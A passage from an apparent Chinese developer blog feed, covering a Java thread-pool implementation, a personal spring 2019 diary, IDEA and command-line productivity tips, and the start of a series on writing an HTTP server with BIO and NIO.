class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newFixedThreadPool</span><span class="params">(<span class="keyword">int</span> nThreads)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(nThreads, nThreads,<span class="number">0L</span>,</span><br><span class="line">            TimeUnit.MILLISECONDS,<span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;());&#125;</span><br></pre></td></tr></table></figure><p>第二种方法最终还是会导向方法一ThreadPoolExecutor的构造方法ThreadPoolExecutor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                           TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                           BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                           ThreadFactory threadFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                           RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p> 工厂模式的好处是：</p><ul><li>用户只要知道名字就行了，比如我想创建一个固定长度的线程池，只需要调用newFixedThreadPool（）方法，而不需要在了解ThreadPoolExecutor构造函数之后自己new一个配置一堆参数。<strong>不需要关注太多细节。</strong></li><li>用工厂模式可以<strong>消除循环依赖</strong>，如果一个类构造函数的参数变了，所有实例化这个类的代码都得改。</li></ul><h3 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h3><p>上一篇我是用synchronized锁住任务队列，工作线程wait和notify去实现线程阻塞去任务队列去任务，jdk是用<strong>LinkedBlockingQueue的put和take</strong>方法来实现。如果put或者take操作无法立即执行，这两个方法调用将会发生<strong>阻塞</strong>，直到能够执行。</p><table><thead><tr><th></th><th><em>抛出异常</em></th><th><em>特殊值</em></th><th><em>阻塞</em></th><th style="text-align:center"><em>超时</em></th></tr></thead><tbody><tr><td><strong>插入</strong></td><td><code>add(e)</code></td><td><code>offer(e)</code></td><td><code>put(e)</code></td><td style="text-align:center"><code>offer(e, time, unit)</code></td></tr><tr><td><strong>移除</strong></td><td><code>remove()</code></td><td><code>poll()</code></td><td><code>take()</code></td><td style="text-align:center"><code>poll(time, unit)</code></td></tr><tr><td><strong>检查</strong></td><td><code>element()</code></td><td><code>peek()</code></td><td><em>不可用</em></td><td style="text-align:center"><em>不可用</em></td></tr></tbody></table><h3 id="延迟加载Lazy-load"><a href="#延迟加载Lazy-load" class="headerlink" title="延迟加载Lazy_load"></a>延迟加载Lazy_load</h3><p>线程池是<strong>懒加载</strong>的，声明的时候并不会创建好线程等待任务，而是当提交第一个任务时才去新建线程；</p><h1 id="三、改进自实现的线程池"><a href="#三、改进自实现的线程池" class="headerlink" title="三、改进自实现的线程池"></a>三、改进自实现的线程池</h1><p>改进</p><p>1.实现延迟加载。我们是在构造函数创建线程，而java线程池只有当提交一个任务时，线程池才会创建一个新线程执行任务，直到当前线程数等于corePoolSize。这样会更节约资源。</p><p>2.这里我们用LinkedList加线程wait（）notify（）来实现，也可以像java线程池一样用阻塞链表LinkedBlockingQueue来实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.LinkedBlockingQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadPool</span> </span>&#123;</span><br><span class="line">    <span class="comment">//工作线程数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> workerCount;</span><br><span class="line">    <span class="comment">// 线程池大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> corePoolSize;</span><br><span class="line">    <span class="comment">// 任务容器</span></span><br><span class="line">    <span class="keyword">private</span> BlockingQueue&lt;Runnable&gt; workQueue;</span><br><span class="line">    <span class="comment">//工作线程容器</span></span><br><span class="line">    <span class="keyword">private</span> Set&lt;Worker&gt; workers;</span><br><span class="line">    <span class="comment">// 任务容器</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ThreadPool threadPool;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ThreadPool <span class="title">newThreadPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        threadPool = <span class="keyword">new</span> ThreadPool(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">return</span> threadPool;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ThreadPool</span><span class="params">(<span class="keyword">int</span> corePoolSize)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">        <span class="comment">//LinkedBlockingQueue的默认容量是Integer.MAX_VALUE，一直加任务线程可能会造成OOM内存溢出</span></span><br><span class="line">        workQueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;&gt;(<span class="number">1024</span>);<span class="comment">//这里指定大小</span></span><br><span class="line">        workers = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (workerCount &lt; corePoolSize) &#123;</span><br><span class="line">            addWorker(r);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                workQueue.put(r);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addWorker</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">        workerCount++;</span><br><span class="line">        Worker worker = <span class="keyword">new</span> Worker(r);</span><br><span class="line">        Thread t = worker.thread;</span><br><span class="line">        workers.add(worker);</span><br><span class="line">        t.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Worker</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">        Runnable task;</span><br><span class="line">        Thread thread;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Worker</span><span class="params">(Runnable task)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.task = task;</span><br><span class="line">            <span class="keyword">this</span>.thread = <span class="keyword">new</span> Thread(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                Runnable task = <span class="keyword">this</span>.task;</span><br><span class="line">                <span class="comment">// 执行当前的任务，所以把这个任务置空，以免造成死循环</span></span><br><span class="line">                <span class="keyword">this</span>.task = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (task != <span class="keyword">null</span> || (task = getTask()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    task.run();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Runnable <span class="title">getTask</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Runnable r = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = workQueue.take();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThreadPool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        ThreadPool threadPool=ThreadPool.newThreadPool();</span><br><span class="line">        <span class="comment">//生成10个任务放入线程池</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            Runnable task=  <span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">"做任务中。。。"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            threadPool.execute(task);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考</p><blockquote><p><a href="https://www.runoob.com/design-pattern/factory-pattern.html" target="_blank" rel="noopener">模式方面菜鸟教程写的不错</a></p><p><a href="https://blog.csdn.net/qq_42135428/article/details/80285737" target="_blank" rel="noopener">Java高并发之BlockingQueue</a></p><p><a href="https://blog.csdn.net/GitHub_boy/article/details/51046574" target="_blank" rel="noopener">https://blog.csdn.net/GitHub_boy/article/details/51046574</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>小记</title>
      <link href="/2019/06/26/%E4%B8%80%E5%88%B7%E5%89%91%E6%8C%87offer/"/>
      <url>/2019/06/26/%E4%B8%80%E5%88%B7%E5%89%91%E6%8C%87offer/</url>
      
        <content type="html"><![CDATA[<p>最近在牛客在线编程题里刷了一遍剑指offer，有十来道做不出的。接下来的计划是刷leetcode，八月份再二刷这本书。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019春</title>
      <link href="/2019/06/01/2019%E6%98%A5/"/>
      <url>/2019/06/01/2019%E6%98%A5/</url>
      
        <content type="html"><![CDATA[<p>我想，博客不止要有技术，更新一些生活，更能体现个人风格。所以以后每一个季度写一篇关于生活的博文。文笔不行，写出来的日记可能就是杂乱无章毫无逻辑的流水账。也不知道能坚持多久。</p><p>这个学期是我在学校的最后一段时间，还跟别人说“晚上在床上想到要毕业了，都能自己笑出声”。但其实这段时间并非很开心。<br>3月去面了一些大厂想长长见识。面试从城区坐大巴回来，看着窗外的这个城市，想着今天这次暴露自己哪方面哪方面不行，想着接下来应该往哪方面做，想着还是自己做的不够多。<br>4月有一个蓝桥杯比赛，当时报名的目的就是让对算法一无所知的我，有一个驱动力去啃算法。刷题了两个星期，拿了省三。都不太好意思往简历上写。<br>5月拿到了一些公司的offer。</p><p>拍毕业照的前一天晚上发现kindle不见了，这已经是我第三部kindle啦，短期内也没钱再买一部了。</p><p>牛客群认识一群小哥哥们，未来一起向秋招进攻吧，我是全群最菜没跑了。</p><p>自己的职业专业方向变得清楚，服务端+互联网。github是最近一段时间最经常打开的网站。</p><p>找租房找到头大，城中村不安全，稍微好一点的单间都1.6+，小区房更合租又担心这担心那的。找房烦过找工作。</p><p>最近唯一有关注的综艺是创造营，曾追过孟美岐那一季，节目组设计有少女心。这一季小哥哥们有点参军入伍的感觉，还拉练上下铺行军包hhh总之相比上一季富养小姐姐们是挺苦的，这次节目组挺阳光的，原创歌里面字眼都是“勇气”“拼搏”“出众”上一季觉得美岐宣仪不错，这一季周震南海星，宿友说我都是喜欢第一名hhhh</p><p>最后来一个心得+鸡汤套餐吧，送给如果最近也生活充满压力的你，共勉。<br>心得：当心态崩了该怎么调节？<br>对自己说，<strong>你的情绪不等同你自己。冷静的感知到自己现在是有这样的情绪的，但不要允许自己沉浸在这些情绪里面。</strong>在知乎看看怎么应对负面情绪，或者写写未来的计划，或者想一想这些情绪产生的原因。当做一些可能有用的小行动的时候感觉就会好一些。不要就干坐在那里发呆越想越难受。</p><p>鸡汤：在牛客看到一句话，大家毕业心态变化都是：我很强——&gt;我好菜——&gt;绝望了——&gt;坚持——&gt;offer求比较。吃力有时候说明你在走上坡路。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>提升开发效率-技巧篇</title>
      <link href="/2019/06/01/%E6%8F%90%E5%8D%87%E5%BC%80%E5%8F%91%E6%95%88%E7%8E%87%E7%9A%84%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/06/01/%E6%8F%90%E5%8D%87%E5%BC%80%E5%8F%91%E6%95%88%E7%8E%87%E7%9A%84%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="提升开发效率的技巧"><a href="#提升开发效率的技巧" class="headerlink" title="提升开发效率的技巧"></a>提升开发效率的技巧</h1><h1 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h1><h3 id="常用快捷键排行榜"><a href="#常用快捷键排行榜" class="headerlink" title="常用快捷键排行榜"></a>常用快捷键排行榜</h3><ol><li>复制一行Ctrl+D  （光标所在行）</li><li>删除一行Ctrl+X （光标所在行）</li><li>选中的代码块注释  Ctrl + Shift + / </li><li>代码重新排列格式 Ctrl + Alt + L</li><li>全局替换 Ctrl+Shift+R</li><li>定位到下一个或上一个错误 F2 / Shift + F2</li><li>Ctrl+Shift+F12 专注代码窗口</li><li>Ctrl+E可以找到Recent Files最近浏览过的文件</li><li>Ctrl + Shift + Z取消撤销 </li><li>Ctrl + Shift +回车：无论光标在哪，跳到下一行</li><li>ctrl+alt+v：自动补全方法/new对象的返回值。</li></ol><h3 id="idea中git的使用"><a href="#idea中git的使用" class="headerlink" title="idea中git的使用"></a>idea中git的使用</h3><p>把idea项目关联为git仓库：菜单-&gt;VCS-&gt;import into Version Control-&gt;Create Git Repository-&gt;e:\project\hiworld-OK</p><h3 id="如何热部署？"><a href="#如何热部署？" class="headerlink" title="如何热部署？"></a>如何热部署？</h3><p> <a href="https://blog.csdn.net/weixin_42831477/article/details/82229436" target="_blank" rel="noopener">热部署</a></p><h4 id="idea如何导入setting？"><a href="#idea如何导入setting？" class="headerlink" title="idea如何导入setting？"></a>idea如何导入setting？</h4><p>file -&gt; export setting</p><p>将会导出一个 setting.jar 的文件</p><p>在新安装 IDEA 的电脑上，在开始的界面选择导入 setting </p><h3 id="查看源码五件套"><a href="#查看源码五件套" class="headerlink" title="查看源码五件套"></a>查看源码五件套</h3><ol><li><p>一次性折叠所有Java方法：ctrl +shift+ 减号</p></li><li><p>ctrl+鼠标单击某类 可以跳进该类查看源码</p></li><li><p>Ctrl+F12 显示这个类的方法的（弹出窗口）</p></li><li><p>alt + 7  显示这个类的方法的（左侧项目文件显示）</p></li><li><p>Ctrl+O，这个用于查看一个类的纲要，再按一次时，列出该类继承的方法及变量。</p></li></ol><p>选中当前类中右击鼠标，右键菜单中选择Diagrams&gt;Show Diagrams，快捷键Ctrl+Alt+Shift+U(不同的系统和快捷键风格快捷键会有差异)。如果是spring的类会出现如图所示的弹框，第一项是类图结构，第二个是spring beans的依赖</p><h1 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h1><p>常用命令</p><p><a href="https://www.runoob.com/w3cnote/linux-common-command-2.html" target="_blank" rel="noopener">菜鸟教程常用命令</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">切换目录</span><br><span class="line">cd /usr查看目录下的文件lsls -lh 遍历详细信息，如权限，所属用户，创建日期，大小等等信息</span><br><span class="line">查看当前所处目录pwd</span><br><span class="line">创建目录文件mkdir -p /test/abctouch test.java</span><br><span class="line">删除文件</span><br><span class="line">rm -f test.java</span><br><span class="line">vi abc.txt要进行编辑，要输入 a 或者 i ，才可以进行编辑哦</span><br><span class="line">要退出，首先要离开当前的编辑模式，点击左上角的ESC键，退出编辑模式然后输入冒号 (shift+分号) 打开控制命令接着输入wq，然后敲回车，即保存退出wq 是quit+write的缩写</span><br></pre></td></tr></table></figure><h2 id="云服务器"><a href="#云服务器" class="headerlink" title="云服务器"></a>云服务器</h2><p><a href="https://promotion.aliyun.com/ntms/campus2017.html" target="_blank" rel="noopener">云翼计划,9.9一个月，需要学生认证</a></p><p><a href="http://how2j.cn/k/deploy2linux/deploy2linux-breif/1591.html" target="_blank" rel="noopener">安装常用软件比如java、mysql的步骤</a></p><p><a href="https://blog.csdn.net/M_Kerry/article/details/81664548" target="_blank" rel="noopener">MobaXterm和Navicat，远程连接服务器和数据库，不用每次都登陆阿里云网站，很好用</a></p><h1 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h1><p>在文件夹空白处按住Shift，然后右键弹出快捷菜单，可以看到“在此处打开命令行窗口”</p><p>使用上下方向键，翻看使用过的命令</p><p>cd   切换目录</p><p>例：cd   // 显示当前目录</p><p>例：cd ..   // 进入父目录</p><p>例：cd /d d:   // 进入上次d盘所在的目录（或在直接输入：d:）</p><p>例：cd /d d:\   // 进入d盘根目录</p><p>例：cd d: // 显示上次d盘所在的目录</p><p>例：cd /d d:\src // 进入d:\src目录</p><p>例：cd prj\src\view  // 进入当前目录下的prj\src\view文件夹</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Markdown工具"><a href="#Markdown工具" class="headerlink" title="Markdown工具"></a>Markdown工具</h2><p>印象笔记：印象笔记也可以写md，体验一般</p><p>typora ：md文件编辑器，用起来很舒服（本篇就是用它写的）</p><p>Writage 可直接将md文件打开为word，安装轻便。</p><h2 id="资源搜索"><a href="#资源搜索" class="headerlink" title="资源搜索"></a>资源搜索</h2><p>盘搜搜：可以直接搜索网盘分享链接</p><p>闲鱼：盘搜搜搜不到的网盘链接，可以在里搜搜</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="合并多个word-pdf-md文件为一个？"><a href="#合并多个word-pdf-md文件为一个？" class="headerlink" title="合并多个word/pdf/md文件为一个？"></a>合并多个word/pdf/md文件为一个？</h2><p>打开命令行cmd，输入下面这行命令，即可把E:\File目录下所有md文件合并成一个文件。</p><p>输入和输出路径不需要一样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type E:\File\*.md &gt;&gt; E:\File\margeFile.md</span><br></pre></td></tr></table></figure><p>上哪可以快速获取学习资源资料？</p><h2 id="端口被占用？"><a href="#端口被占用？" class="headerlink" title="端口被占用？"></a>端口被占用？</h2><p>下面三行代码解决问题</p><p>打开cmd命令行窗口</p><p>第一行代码：查看端口号包含”80”的占用情况</p><p>第二行代码：根据上一步找到的80端口对应的pid是1828</p><p>结束java.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano|findstr &quot;8000&quot;</span><br><span class="line"></span><br><span class="line">tasklist|findstr &quot;4760&quot;</span><br><span class="line"></span><br><span class="line">taskkill /f /t /im java.exe</span><br></pre></td></tr></table></figure><h2 id="md文件转pdf？"><a href="#md文件转pdf？" class="headerlink" title="md文件转pdf？"></a>md文件转pdf？</h2><p>VScode安装插件后可以转。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>手写http服务器（一）</title>
      <link href="/2019/05/29/%E6%89%8B%E5%86%99http%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2019/05/29/%E6%89%8B%E5%86%99http%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里默认读者是连http服务器是啥一点概念都没有（但是得有网络编程基础），会从最基本的概念讲起，一步步写一个服务器，大神就不要点进来看我献丑了hhh</p></blockquote><h1 id="版本全览"><a href="#版本全览" class="headerlink" title="版本全览"></a>版本全览</h1><p>版本一：基于bio百行代码实现http服务器<br>版本二：基于nio<br>版本三：serlevt容器、cookie、封装、日志<br>版本四：长连接、参考了tomcat设计</p><h1 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h1><p><em>早在学jsp的时候，就很好奇tomcat是什么，为什么可以运行jsp、servlet？当时试图看业界盛誉的《how to tomcat work》，没看懂（但这确实是本神书）；问师兄，师兄也不太清楚。网上的博客就更不用说了。这个困惑就先被我放到一边去了。<br>寒假的时候用socket、多线程写了一个聊天室。突然明白，其实tomcat就像一个聊天室的服务器啊，浏览器相当于客户端，HTTP请求响应相当于聊天消息，浏览器给服务器发消息，服务器做处理。http报文只是遵守一定格式的字符串。<br>只不过聊天室的服务器是把收到的信息转发给其他客户端。而HTTP的服务的返回一个符合HTTP协议的消息。<br>最初的版本v1，只能把收到的HTTP报文打印到控制台，返回浏览器响应显示一句话。<br>后来发现github上比我大一两届的前辈也写过这个东西，但是他们有好多功能比如基于nio、servlet等等，像模像样。受到启发，这项目认真起来大有搞头。就有了把这个当成自己的一个项目去完善的心态。看了一些书、博客、视频。最近还发现群里的小伙伴也有在写这个的，此处点名糖糖。</em><br>写这个服务器的好处：</p><ul><li>写轮子所需几乎覆盖java所有知识点，因为即使是一个xml解析也要自己写，不像写后台一样有很多框架、工具可以用。</li><li>成就感强。tomcat算比较适合自己造轮子的入门中间件。曾经也有写一个Spring的想法，但看了源码之后就放弃了。Spring源码优秀，适合参读，但不太适合自己撸一个。</li><li>对后台开发的眼界会</li></ul><h1 id="V1"><a href="#V1" class="headerlink" title="V1"></a>V1</h1><h2 id="关键字：bio、百行代码内"><a href="#关键字：bio、百行代码内" class="headerlink" title="关键字：bio、百行代码内"></a>关键字：bio、百行代码内</h2><p><strong><em><a href="https://github.com/wangxuanni/MyTomcat/tree/master/src/v1/BioServer.java" target="_blank" rel="noopener">代码链接</a></em></strong></p><h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><ul><li>BIO</li><li>Socket</li><li>缓存线程池</li><li>lambda表达式</li><li>HTTP请求响应报文</li></ul><h2 id="5个步骤的关键代码"><a href="#5个步骤的关键代码" class="headerlink" title="5个步骤的关键代码"></a>5个步骤的关键代码</h2><p>一、开启服务器绑定端口<br><code>ServerSocket serverSocket = new ServerSocket(8080);</code><br>二、一直循环等待<br><code>while（true）{</code><br>三、收到请求的套接字<br><code>Socket socket = serverSocket.accept();</code><br>四、套接字可以获得一个字节输入流，把这个输入流转成字符串，打印在控制台。<br><code>InputStream inputStream = socket.getInputStream();</code><br>五、创建响应报文（其实就是按照HTTP报文的格式构建的一个字符串）并返回响应<br><code>BufferedWriter bw =new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));</code></p><h2 id="注意一些小坑"><a href="#注意一些小坑" class="headerlink" title="注意一些小坑"></a>注意一些小坑</h2><p>缓存字符流写入后记得要刷新！！！bw.flush();<br>选择缓存线程池是因为它更适合短连接。<br>构建响应报文用StringBuilder比String更好<br>响应报文正文要构建好并且要记录长度，因为响应头有一个Content-length:正文长度属性要填<br>记得在finally块把socket.close()关闭</p><h1 id="V2"><a href="#V2" class="headerlink" title="V2"></a>V2</h1><h2 id="关键字：NIO"><a href="#关键字：NIO" class="headerlink" title="关键字：NIO"></a>关键字：NIO</h2><p>这个版本主要从bio升级为nio。<br><strong><em><a href="https://github.com/wangxuanni/MyTomcat/tree/master/src/v2" target="_blank" rel="noopener">代码链接</a></em></strong><br>v2<br>最重要是弄懂nio是时候掏出我之前的bio、nio笔记了。</p><h3 id="bio"><a href="#bio" class="headerlink" title="bio"></a>bio</h3><p>先讲一下bio抛砖引玉，主要是为了和nio做对比。</p><h4 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h4><p>阻塞并同步。特点是IO两个阶段被阻塞。基于流模型。<br>客户端一个请求服务端就启动一个线程，线序发生请求给内核，由内核去通信，在内核准备好数据之前，线程是被挂起的，知道数据从内核复制到用户空间。调用是可靠的线性顺序<br>缺点：每次请求创建一个线程在销毁开销比较大，操作系统对线程的总数有限制，太多服务器可能瘫痪。可以用线程池改进。<br>创建bio服务器只需要一步。</p><h4 id="2-配置服务器"><a href="#2-配置服务器" class="headerlink" title="2.配置服务器"></a>2.配置服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一、ServerSocket serverSocket = new ServerSocket(8080);</span><br></pre></td></tr></table></figure><h4 id="3-处理请求返回响应"><a href="#3-处理请求返回响应" class="headerlink" title="3.处理请求返回响应"></a>3.处理请求返回响应</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">二、一直循环等待</span><br><span class="line">`while（true）&#123;</span><br><span class="line">三、收到请求的套接字</span><br><span class="line">`Socket socket = serverSocket.accept();`</span><br><span class="line">四、用套接字得到输入输出流，处理请求响应</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nio"><a href="#nio" class="headerlink" title="nio"></a>nio</h3><h4 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1.概念"></a>1.概念</h4><p>非阻塞并同步。可构建多路复用、同步非阻塞的io操作。特点是程序去不断询问内核是否准备好，基于buffers。<br>客户端请求会注册到多路复用上，单线程轮询到有io请求时，才启动一个线程进行处理，仅仅selector是阻塞的。<br>核心：Channels（类似流，全双工，可以读写。socketChannel、serverSocketChannel）<br>buffers8种基本类型都有，数据从channel读到buffer中，也可以从buffer写到channel。本质是一块方便读写数据的内存<br>selector多路复用器，以监听多个Channel通道感兴趣的事情。允许单线程处理多个channel。 </p><ul><li>OP_ACCEPT: 接收就绪</li><li>OP_READ: 读取就绪</li><li>OP_WRITE: 写入就绪</li><li>OP_CONNECT: 连接就绪</li></ul><p>一个server socket 